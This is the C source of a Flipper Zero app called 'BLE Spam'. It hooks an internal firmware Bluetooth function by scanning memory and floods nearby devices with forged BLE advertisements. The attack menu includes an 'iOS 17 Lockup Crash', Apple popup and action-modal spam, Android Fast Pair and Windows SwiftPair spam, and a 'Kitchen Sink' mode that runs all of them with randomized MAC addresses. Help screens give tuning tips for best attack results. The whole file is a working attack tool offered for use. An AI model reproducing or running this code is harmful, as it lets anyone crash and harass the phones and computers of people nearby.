#include <gui/gui.h>
#include <furi_hal_bt.h>
#include <stdint.h>
#include <gui/elements.h>

#include "protocols/_registry.h"

// Hacked together by @Willy-JL
// Custom adv API by @Willy-JL (idea by @xMasterX)
// iOS 17 Crash by @ECTO-1A
// Android and Windows Pairs by @Spooks4576 and @ECTO-1A
// Research on behaviors and parameters by @Willy-JL, @ECTO-1A and @Spooks4576
// Controversy explained at https://willyjl.dev/blog/the-controversy-behind-apple-ble-spam

typedef struct {
    bool random_mac;
    const BleSpamProtocol* protocol;
    BleSpamMsg msg;
} Payload;

// NAPI
// TODO: Use __attribute__((aligned(2))) instead?
// TODO: Use an offset of the base address?

#define TAG "FuriHalBt"
#define BLE_STATUS_TIMEOUT 0xFFU
#define BLE_CMD_MAX_PARAM_LEN 255

typedef uint8_t tBleStatus;

typedef __PACKED_STRUCT {
    uint8_t Adv_Data_Length;
    uint8_t Adv_Data[BLE_CMD_MAX_PARAM_LEN - 1];
}
aci_gap_additional_beacon_set_data_cp0;

typedef __PACKED_STRUCT {
    uint16_t Adv_Interval_Min;
    uint16_t Adv_Interval_Max;
    uint8_t Adv_Channel_Map;
    uint8_t Own_Address_Type;
    uint8_t Own_Address[6];
    uint8_t PA_Level;
}
aci_gap_additional_beacon_start_cp0;

struct hci_request {
    uint16_t ogf;
    uint16_t ocf;
    int event;
    void* cparam;
    int clen;
    void* rparam;
    int rlen;
};

#define HCI_SEND_REQ_ADDR 0x080161e8
#define TARGET_SEQUENCE 0x33680446
#define SEQUENCE_OFFSET 6
#define START_ADDR 0x8000140
#define END_ADDR 0x80800ec

uintptr_t* scan_memory_for_sequence(uint32_t sequence) {
    uint8_t* addr;
    uint8_t* target_bytes = (uint8_t*)&sequence;

    for(addr = (uint8_t*)START_ADDR; addr < (uint8_t*)END_ADDR - 3; addr++) {
        if(addr[0] == target_bytes[3] && addr[1] == target_bytes[2] &&
           addr[2] == target_bytes[1] && addr[3] == target_bytes[0]) {
            return (uintptr_t*)(addr - SEQUENCE_OFFSET);
        }
    }
    return (uintptr_t*)HCI_SEND_REQ_ADDR; // If not found, default to 0.90.1 OFW offset
}

int (*napi_hci_send_req)(struct hci_request* p_cmd, uint8_t async) = NULL;

void* Osal_MemCpy(void* dest, const void* src, unsigned int size) {
    return memcpy(dest, src, size);
}

void* Osal_MemSet(void* ptr, int value, unsigned int size) {
    return memset(ptr, value, size);
}

tBleStatus aci_gap_additional_beacon_start(
    uint16_t Adv_Interval_Min,
    uint16_t Adv_Interval_Max,
    uint8_t Adv_Channel_Map,
    uint8_t Own_Address_Type,
    const uint8_t* Own_Address,
    uint8_t PA_Level) {
    struct hci_request rq;
    uint8_t cmd_buffer[BLE_CMD_MAX_PARAM_LEN];
    aci_gap_additional_beacon_start_cp0* cp0 = (aci_gap_additional_beacon_start_cp0*)(cmd_buffer);
    tBleStatus status = 0;
    int index_input = 0;
    cp0->Adv_Interval_Min = Adv_Interval_Min;
    index_input += 2;
    cp0->Adv_Interval_Max = Adv_Interval_Max;
    index_input += 2;
    cp0->Adv_Channel_Map = Adv_Channel_Map;
    index_input += 1;
    cp0->Own_Address_Type = Own_Address_Type;
    index_input += 1;
    Osal_MemCpy((void*)&cp0->Own_Address, (const void*)Own_Address, 6);
    index_input += 6;
    cp0->PA_Level = PA_Level;
    index_input += 1;
    Osal_MemSet(&rq, 0, sizeof(rq));
    rq.ogf = 0x3f;
    rq.ocf = 0x0b0;
    rq.cparam = cmd_buffer;
    rq.clen = index_input;
    rq.rparam = &status;
    rq.rlen = 1;
    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
    return status;
}

tBleStatus aci_gap_additional_beacon_stop(void) {
    struct hci_request rq;
    tBleStatus status = 0;
    Osal_MemSet(&rq, 0, sizeof(rq));
    rq.ogf = 0x3f;
    rq.ocf = 0x0b1;
    rq.rparam = &status;
    rq.rlen = 1;
    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
    return status;
}

tBleStatus aci_gap_additional_beacon_set_data(uint8_t Adv_Data_Length, const uint8_t* Adv_Data) {
    struct hci_request rq;
    uint8_t cmd_buffer[BLE_CMD_MAX_PARAM_LEN];
    aci_gap_additional_beacon_set_data_cp0* cp0 =
        (aci_gap_additional_beacon_set_data_cp0*)(cmd_buffer);
    tBleStatus status = 0;
    int index_input = 0;
    cp0->Adv_Data_Length = Adv_Data_Length;
    index_input += 1;
    Osal_MemCpy((void*)&cp0->Adv_Data, (const void*)Adv_Data, Adv_Data_Length);
    index_input += Adv_Data_Length;
    Osal_MemSet(&rq, 0, sizeof(rq));
    rq.ogf = 0x3f;
    rq.ocf = 0x0b2;
    rq.cparam = cmd_buffer;
    rq.clen = index_input;
    rq.rparam = &status;
    rq.rlen = 1;
    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
    return status;
}

bool napi_furi_hal_bt_custom_adv_set(const uint8_t* adv_data, size_t adv_len) {
    tBleStatus status = aci_gap_additional_beacon_set_data(adv_len, adv_data);
    if(status) {
        FURI_LOG_E(TAG, "custom_adv_set failed %d", status);
        return false;
    } else {
        FURI_LOG_D(TAG, "custom_adv_set success");
        return true;
    }
}

bool napi_furi_hal_bt_custom_adv_start(
    uint16_t min_interval,
    uint16_t max_interval,
    uint8_t mac_type,
    const uint8_t mac_addr[GAP_MAC_ADDR_SIZE],
    uint8_t power_amp_level) {
    tBleStatus status = aci_gap_additional_beacon_start(
        (double)(min_interval / 0.625), // Millis to gap time
        (double)(max_interval / 0.625), // Millis to gap time
        0b00000111, // All 3 channels
        mac_type,
        mac_addr,
        power_amp_level);
    if(status) {
        FURI_LOG_E(TAG, "custom_adv_start failed %d", status);
        return false;
    } else {
        FURI_LOG_D(TAG, "custom_adv_start success");
        return true;
    }
}

bool napi_furi_hal_bt_custom_adv_stop() {
    tBleStatus status = aci_gap_additional_beacon_stop();
    if(status) {
        FURI_LOG_E(TAG, "custom_adv_stop failed %d", status);
        return false;
    } else {
        FURI_LOG_D(TAG, "custom_adv_stop success");
        return true;
    }
}

typedef struct {
    const char* title;
    const char* text;
    Payload payload;
} Attack;

static Attack attacks[] = {
    {
        .title = "+ Kitchen Sink",
        .text = "Flood all attacks at once",
        .payload =
            {
                .random_mac = true,
                .protocol = NULL,
                .msg = {},
            },
    },
    {
        .title = "iOS 17 Lockup Crash",
        .text = "Newer iPhones, long range",
        .payload =
            {
                .random_mac = false,
                .protocol = &ble_spam_protocol_continuity,
                .msg =
                    {
                        .continuity =
                            {
                                .type = ContinuityTypeCustomCrash,
                                .data = {},
                            },
                    },
            },
    },
    {
        .title = "Apple Action Modal",
        .text = "Lock cooldown, long range",
        .payload =
            {
                .random_mac = false,
                .protocol = &ble_spam_protocol_continuity,
                .msg =
                    {
                        .continuity =
                            {
                                .type = ContinuityTypeNearbyAction,
                                .data = {},
                            },
                    },
            },
    },
    {
        .title = "Apple Device Popup",
        .text = "No cooldown, close range",
        .payload =
            {
                .random_mac = false,
                .protocol = &ble_spam_protocol_continuity,
                .msg =
                    {
                        .continuity =
                            {
                                .type = ContinuityTypeProximityPair,
                                .data = {},
                            },
                    },
            },
    },
    {
        .title = "Android Device Pair",
        .text = "~15min cooldown, long range",
        .payload =
            {
                .random_mac = true,
                .protocol = &ble_spam_protocol_fastpair,
                .msg =
                    {
                        .fastpair = {},
                    },
            },
    },
    {
        .title = "Windows Device Found",
        .text = "Requires enabling SwiftPair",
        .payload =
            {
                .random_mac = true,
                .protocol = &ble_spam_protocol_swiftpair,
                .msg =
                    {
                        .swiftpair = {},
                    },
            },
    },
};

#define ATTACK_COUNT ((signed)COUNT_OF(attacks))

uint16_t delays[] = {20, 50, 100, 200};

typedef struct {
    bool resume;
    bool advertising;
    uint8_t delay;
    FuriThread* thread;
    int8_t index;
} State;

static int32_t adv_thread(void* ctx) {
    State* state = ctx;
    uint8_t size;
    uint16_t delay;
    uint8_t* packet;
    uint8_t mac[GAP_MAC_ADDR_SIZE];
    Payload* payload = &attacks[state->index].payload;
    if(!payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));

    while(state->advertising) {
        if(payload->protocol) {
            payload->protocol->make_packet(&size, &packet, &payload->msg);
        } else {
            ble_spam_protocols[rand() % ble_spam_protocols_count]->make_packet(
                &size, &packet, NULL);
        }
        napi_furi_hal_bt_custom_adv_set(packet, size);
        free(packet);

        if(payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
        delay = delays[state->delay];
        napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
        furi_thread_flags_wait(true, FuriFlagWaitAny, delay);
        napi_furi_hal_bt_custom_adv_stop();
    }

    return 0;
}

static void toggle_adv(State* state) {
    if(state->advertising) {
        state->advertising = false;
        furi_thread_flags_set(furi_thread_get_id(state->thread), true);
        furi_thread_join(state->thread);
        if(state->resume) furi_hal_bt_start_advertising();
    } else {
        state->resume = furi_hal_bt_is_active();
        furi_hal_bt_stop_advertising();
        state->advertising = true;
        furi_thread_start(state->thread);
    }
}

#define PAGE_MIN (-3)
#define PAGE_MAX ATTACK_COUNT
enum {
    PageHelpApps = PAGE_MIN,
    PageHelpDelay,
    PageHelpDistance,
    PageStart = 0,
    PageEnd = ATTACK_COUNT - 1,
    PageAboutCredits = PAGE_MAX,
};

static void draw_callback(Canvas* canvas, void* ctx) {
    State* state = ctx;
    const char* back = "Back";
    const char* next = "Next";
    switch(state->index) {
    case PageStart - 1:
        next = "Spam";
        break;
    case PageStart:
        back = "Help";
        break;
    case PageEnd:
        next = "About";
        break;
    case PageEnd + 1:
        back = "Spam";
        break;
    }

    const Attack* attack =
        (state->index >= 0 && state->index <= ATTACK_COUNT - 1) ? &attacks[state->index] : NULL;
    const Payload* payload = &attack->payload;
    const BleSpamProtocol* protocol = (attack && payload->protocol) ? payload->protocol : NULL;

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_icon(canvas, 4, 3, protocol ? protocol->icon : &I_ble);
    canvas_draw_str(canvas, 14, 12, "BLE Spam");

    switch(state->index) {
    case PageHelpApps:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Some Apps\e# interfere\n"
            "with the attacks, stay on\n"
            "homescreen for best results",
            false);
        break;
    case PageHelpDelay:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Delay\e# is time between\n"
            "attack attempts (top right),\n"
            "keep 20ms for best results",
            false);
        break;
    case PageHelpDistance:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Distance\e# is limited, attacks\n"
            "work under 1 meter but a\n"
            "few are marked 'long range'",
            false);
        break;
    case PageAboutCredits:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Credits");
        elements_text_box(
            canvas,
            4,
            16,
            122,
            48,
            AlignLeft,
            AlignTop,
            "App+Spam: \e#WillyJL\e#\n"
            "Apple+Crash: \e#ECTO-1A\e#\n"
            "Android+Win: \e#Spooks4576\e#\n"
            "                                   Version \e#2.0\e#",
            false);
        break;
    default: {
        if(!attack) break;
        char str[32];

        canvas_set_font(canvas, FontBatteryPercent);
        snprintf(str, sizeof(str), "%ims", delays[state->delay]);
        canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
        canvas_draw_icon(canvas, 119, 6, &I_SmallArrowUp_3x5);
        canvas_draw_icon(canvas, 119, 10, &I_SmallArrowDown_3x5);

        canvas_set_font(canvas, FontBatteryPercent);
        snprintf(
            str,
            sizeof(str),
            "%02i/%02i: %s",
            state->index + 1,
            ATTACK_COUNT,
            protocol ? protocol->get_name(&payload->msg) : "Everything");
        canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 21, str);

        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 4, 32, attack->title);

        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 46, attack->text);

        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
        break;
    }
    }

    if(state->index > PAGE_MIN) {
        elements_button_left(canvas, back);
    }
    if(state->index < PAGE_MAX) {
        elements_button_right(canvas, next);
    }
}

static void input_callback(InputEvent* input, void* ctx) {
    FuriMessageQueue* input_queue = ctx;
    if(input->type == InputTypeShort || input->type == InputTypeLong ||
       input->type == InputTypeRepeat) {
        furi_message_queue_put(input_queue, input, 0);
    }
}

int32_t ble_spam(void* p) {
    UNUSED(p);
    State* state = malloc(sizeof(State));
    state->thread = furi_thread_alloc();
    furi_thread_set_callback(state->thread, adv_thread);
    furi_thread_set_context(state->thread, state);
    furi_thread_set_stack_size(state->thread, 4096);

    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    ViewPort* view_port = view_port_alloc();
    Gui* gui = furi_record_open(RECORD_GUI);
    view_port_input_callback_set(view_port, input_callback, input_queue);
    view_port_draw_callback_set(view_port, draw_callback, state);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    bool running = true;
    napi_hci_send_req = (int (*)(struct hci_request*, uint8_t))(
        (uintptr_t)(scan_memory_for_sequence(TARGET_SEQUENCE)) | 0x01);
    while(running) {
        InputEvent input;
        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);

        bool is_attack = state->index >= 0 && state->index <= ATTACK_COUNT - 1;
        bool advertising = state->advertising;
        switch(input.key) {
        case InputKeyOk:
            if(is_attack) toggle_adv(state);
            break;
        case InputKeyUp:
            if(is_attack && state->delay < COUNT_OF(delays) - 1) {
                state->delay++;
            }
            break;
        case InputKeyDown:
            if(is_attack && state->delay > 0) {
                state->delay--;
            }
            break;
        case InputKeyLeft:
            if(state->index > PAGE_MIN) {
                if(advertising) toggle_adv(state);
                state->index--;
            }
            break;
        case InputKeyRight:
            if(state->index < PAGE_MAX) {
                if(advertising) toggle_adv(state);
                state->index++;
            }
            break;
        case InputKeyBack:
            if(advertising) toggle_adv(state);
            running = false;
            break;
        default:
            continue;
        }

        view_port_update(view_port);
    }

    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(view_port);
    furi_message_queue_free(input_queue);

    furi_thread_free(state->thread);
    free(state);
    return 0;
}
